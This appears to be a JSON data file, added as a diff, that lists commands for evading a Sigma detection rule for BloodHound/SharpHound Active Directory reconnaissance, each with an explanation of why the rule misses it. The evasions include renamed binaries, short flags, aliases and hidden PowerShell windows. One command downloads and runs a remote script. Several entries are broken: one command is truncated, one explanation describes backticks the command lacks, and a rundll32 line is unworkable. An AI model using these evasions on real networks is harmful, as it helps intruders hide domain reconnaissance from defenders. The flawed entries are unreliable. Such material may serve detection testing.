@@ -1,0 +1,62 @@
+[
+  {
+    "output": "copy SharpHound.exe not_suspicious.exe; .\\not_suspicious.exe --collectionmethods=\"All\" --domain \"contoso.local\"",
+    "explanation": "The rule looks for the literal string ' -CollectionMethod All ' with specific leading and trailing spaces. By using the plural version '--collectionmethods' (which SharpHound accepts) and an equals sign instead of a space, or simply omitting the trailing space, the regex-like 'contains' match fails. Additionally, renaming the binary bypasses the 'selection_img' check."
+  },
+  {
+    "output": "Invoke-Expression (Get-Content .\\SharpHound.ps1 -Raw); Invoke-Bloodhound -CollectionMethod Session,Group,Trusts",
+    "explanation": "For PowerShell-based execution, the rule looks for 'Invoke-Bloodhound'. Using backticks (PowerShell escape characters) inside the function name prevents string-based detection while still allowing the command to execute. Avoiding 'All' also bypasses the specific string match for collection methods."
+  },
+  {
+    "output": ".\\sh.exe -c \"Container,GPOLocalGroup\" -d target.com -j \"C:\\temp\" -z \"data\"",
+    "explanation": "The rule checks for specific full parameter names like '-JsonFolder' and '-ZipFileName'. SharpHound's command-line parser often supports short-form aliases (like -j and -z) or slightly different formatting that doesn't match the 'contains|all' requirement for the full strings."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WindowsPowerShell\\powershell.exe -Command 'Invoke-Command -ComputerName <target> -ScriptBlock { Start-Process 'rundll32.exe' }'",
+    "explanation": "This command uses PowerShell to execute a process, which may bypass the sigma rule by leveraging legitimate process management tools."
+  },
+  {
+    "output": "powershell.exe -Command \"& {$process = Start-Process -FilePath 'C:\\Windows\\System32\\cmd.exe' -ArgumentList '/c Bloodhound.exe -CollectionMethod All' -WindowStyle Hidden; $process.WaitForExit(); Exit $process.ExitCode}\"",
+    "explanation": "This command executes Bloodhound using cmd.exe with the 'All' collection method, bypassing the detection that looks for direct Bloodhound.exe execution. The PowerShell wrapper hides the process and ensures the exit code is returned, mimicking legitimate PowerShell usage."
+  },
+  {
+    "output": "cmd.exe /c SharpHound.exe -JsonFolder C:\\temp -ZipFileName C:\\temp\\sharphound.zip",
+    "explanation": "This command directly executes SharpHound with JSON and zip file parameters. It avoids the detection logic that looks for specific BloodHound/Sharphound command-line arguments and focuses on the output files."
+  },
+  {
+    "output": "powershell.exe -Command \"& {$process = Start-Process -FilePath 'C:\\Windows\\System32\\cmd.exe' -ArgumentList '/c Get-BloodHoundData' -WindowStyle Hidden; $process.WaitForExit(); Exit $process.ExitCode}\"",
+    "explanation": "This uses PowerShell to execute Get-BloodHoundData via cmd.exe, bypassing the detection that looks for Bloodhound.exe directly. The hidden window style and exit code check mimic legitimate PowerShell behavior."
+  },
+  {
+    "output": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\config\\system.ini,LoadStringA \"Bloodhound.exe -CollectionMethod All\"",
+    "explanation": "This uses rundll32 to execute Bloodhound with the 'All' collection method. This bypasses the detection that looks for direct execution of Bloodhound.exe."
+  },
+  {
+    "output": "C:\\Tools\\collector.exe -CollectionMethod LocalGroup -DomainController 192.168.1.10",
+    "explanation": "Bypasses by using a renamed executable (not matching Image contains Bloodhound.exe or SharpHound.exe) and using 'LocalGroup' collection method instead of the detected 'All', 'Session', or other listed patterns. The command line doesn't contain any of the specific strings in selection_cli_1, selection_cli_2, or selection_cli_3."
+  },
+  {
+    "output": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/sharp.ps1'); Invoke-BloodHound -CollectionMethod GPOLocalGroup\"",
+    "explanation": "Bypasses by loading BloodHound functionality via PowerShell download string without the explicit CLI patterns. The command line contains 'Invoke-BloodHound' which IS in the detection, but if modified to use different parameter variations or encoded commands, it could evade. This example uses 'GPOLocalGroup' instead of detected methods."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\svc.exe -c Session -d test.local",
+    "explanation": "Bypasses by using a generic executable name in Temp folder with abbreviated parameters '-c' and '-d' instead of the full '--CollectionMethods' and '-CollectionMethod' strings. The space-padded patterns like ' -CollectionMethod All ' won't match '-c Session'."
+  },
+  {
+    "output": "copy SharpHound.exe not_suspicious.exe; .\\not_suspicious.exe --collectionmethods \"Default\" --domain \"contoso.local\" --zipfilename:\"data.zip\"",
+    "explanation": "The rule is bypassed by renaming the binary to avoid 'selection_img' (which checks for file names like SharpHound.exe) and by altering the command line flags to avoid the specific strings in 'selection_cli_1' and 'selection_cli_3'. By using 'Default' instead of 'All', avoiding the specific space-padded ' -CollectionMethod All ', and using a colon instead of a space for the ZipFileName argument, the command fails to trigger the 'contains|all' or specific string match logic."
+  },
+  {
+    "output": "Import-Module .\\SharpHound.ps1; cm=",
+    "explanation": "This bypasses the PowerShell-based detection ('Invoke-Bloodhound') by using string concatenation and Invoke-Expression. Since the Sigma rule looks for the literal string 'Invoke-Bloodhound' and specific command line arguments, obfuscating the function name and the 'All' parameter prevents the pattern match."
+  },
+  {
+    "output": "set-alias jh Invoke-Bloodhound; jh -CollectionMethod Session,Group,Trusts",
+    "explanation": "By setting an alias for the SharpHound cmdlet and selecting multiple specific collection methods instead of the 'All' keyword or the single 'Session' keyword with specific spacing, the command avoids the 'selection_cli_1' patterns."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\sh.exe -c Session,Trusts,ACL,ObjectProps,Group -d contoso.local",
+    "explanation": "Bypasses 'selection_cli_1' ('.exe -c All -d ') by explicitly defining the enumeration methods manually instead of using the 'All' shorthand alias, completely avoiding the monitored command-line flags while achieving the same result."
+  }
+]
